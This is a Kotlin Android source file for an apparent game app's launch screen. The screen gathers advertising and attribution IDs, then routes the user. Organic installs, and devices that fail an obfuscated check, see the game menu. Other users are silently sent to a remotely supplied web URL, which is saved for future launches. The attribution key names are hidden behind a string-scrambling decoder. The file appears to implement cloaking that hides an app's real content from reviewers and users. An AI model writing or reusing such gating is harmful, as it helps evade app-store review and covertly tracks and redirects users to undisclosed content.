package com.happyadda.jaleb.ui

import android.webkit.URLUtil
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.size
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.runtime.livedata.observeAsState
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.happyadda.jaleb.data.game.preferences.NigLinkPreferences
import com.happyadda.jaleb.di.NightApplication
import com.happyadda.jaleb.utils.comhappyaddajaleb
import com.happyadda.jaleb.utils.nigCheckInternet
import com.happyadda.jaleb.utils.sfaddsfkokoSecrure
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

@Composable
fun NigInitPage(navController: NavController) {
    val nigInitViewModel: NigInitViewModel = viewModel()
    val nigContext = LocalContext.current
    val nigScope = rememberCoroutineScope()

    val nigAfState = NightApplication.nigAppsFlyerState.observeAsState().value

    val nigPBarVisible = remember { mutableStateOf(true) }
    val nigLinkCollected = remember { mutableStateOf(false) }
    val nigAlertDialogShowed = remember { mutableStateOf(true) }

    val nigLinkPreferences = NigLinkPreferences(nigContext)
    val nigLink = nigLinkPreferences.nigGetLink.collectAsState(initial = "")


    fun nigCollectLink() {
        nigPBarVisible.value = false
        if (nigInitViewModel.checkForOrganic()) {
            navigateToMenuPage(navController)
            nigLinkCollected.value = true
            return
        }

        if (sfaddsfkokoSecrure(nigContext)) {
            navigateToMenuPage(navController)
            nigLinkCollected.value = true
            return
        }

        nigAfState?.let {
            val nigCollectedLink = nigInitViewModel.nigCollectLink(nigContext)
            if (URLUtil.isValidUrl(nigCollectedLink)) {
                navigateToWebPage(navController, nigCollectedLink)
                nigLinkCollected.value = true

                nigScope.launch {
                    nigLinkPreferences.nigSaveLink(nigCollectedLink)
                }
            }
        }
    }


    fun nigStartFb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(nigContext) {
            val nigUri = it?.targetUri
            nigInitViewModel.nigSetDeepLink(nigUri)
        }
    }

    fun nigGetGoogleID() {
        val nigID = AdvertisingIdClient.getAdvertisingIdInfo(nigContext).id.toString()
        nigInitViewModel.nigSetGoogleID(nigID)
    }


    fun nigGetAppsFlyerParams() {
        val nigAfId = AppsFlyerLib.getInstance().getAppsFlyerUID(nigContext).toString()
        nigInitViewModel.nigSetAfUserId(nigAfId)

        nigAfState?.let {
            it.forEach { inform ->
                when (inform.key) {
                    "ct_eaaijq".comhappyaddajaleb() -> nigInitViewModel.nigSetAfStatus(inform.value.toString())
                    "eoywaxvl".comhappyaddajaleb() -> nigInitViewModel.nigSetCampaign(inform.value.toString())
                    "osppa_hdsrfh".comhappyaddajaleb() -> nigInitViewModel.nigSetMediaSource(inform.value.toString())
                    "ct_ooacccl".comhappyaddajaleb() -> nigInitViewModel.nigSetAfChannel(inform.value.toString())
                }
            }
            nigCollectLink()
        }
    }

    fun nigBeginWork() = nigScope.launch {
        withContext(Dispatchers.IO) {
            nigStartFb()
            nigGetGoogleID()
        }
        nigGetAppsFlyerParams()
    }

    fun initLoading() {
        if (nigCheckInternet(nigContext)) {
            nigPBarVisible.value = true

            if (nigLink.value.isNotBlank()) {
                navigateToWebPage(navController, nigLink.value)
                nigLinkCollected.value = true
            } else {
                nigInitViewModel.setUrlAndOrganic(
                    ( nigContext.applicationContext as NightApplication).nightDayLightSunService
                ) { correct ->
                    if (correct) {
                        nigBeginWork()
                    } else {
                        navigateToMenuPage(navController)
                        nigLinkCollected.value = true
                    }
                }
            }
        } else {
            nigPBarVisible.value = false
            nigAlertDialogShowed.value = false
        }
    }

    @Composable
    fun showNigNoInternetDialog() {
        if (!nigAlertDialogShowed.value) {
            AlertDialog(
                onDismissRequest = {},
                title = { Text("No internet connection") },
                text = { Text(text = "Check your internet connection and try again later") },
                confirmButton = {
                    TextButton(onClick = {
                        nigAlertDialogShowed.value = true
                        initLoading()
                    }) {
                        Text(
                            "Try again",
                            color = MaterialTheme.colorScheme.onPrimary
                        )
                    }
                }
            )
        }
    }

    Surface(
        color = Color.Black,
        modifier = Modifier.fillMaxSize(),
    ) {
        Box(contentAlignment = Alignment.Center) {
            CircularProgressIndicator(
                modifier = Modifier.size(110.dp),
                color = Color.White
            )
        }
    }

    LaunchedEffect(nigLink.value) {
        nigScope.launch {
            if (!nigLinkCollected.value) initLoading()
        }
    }
    LaunchedEffect(nigAfState) {
        nigScope.launch {
            if (!nigLinkCollected.value) nigGetAppsFlyerParams()
        }
    }

    if (!nigAlertDialogShowed.value) {
        showNigNoInternetDialog()
    }
}

fun navigateToWebPage(navController: NavController, nigLink: String) {
    val nigEncodedUrl = URLEncoder.encode(nigLink, StandardCharsets.UTF_8.toString())
    navController.navigate("web/$nigEncodedUrl") {
        popUpTo("init") {
            inclusive = true
        }
    }
}

fun navigateToMenuPage(navController: NavController) {
    navController.navigate("menu") {
        popUpTo("init") { inclusive = true }
    }
}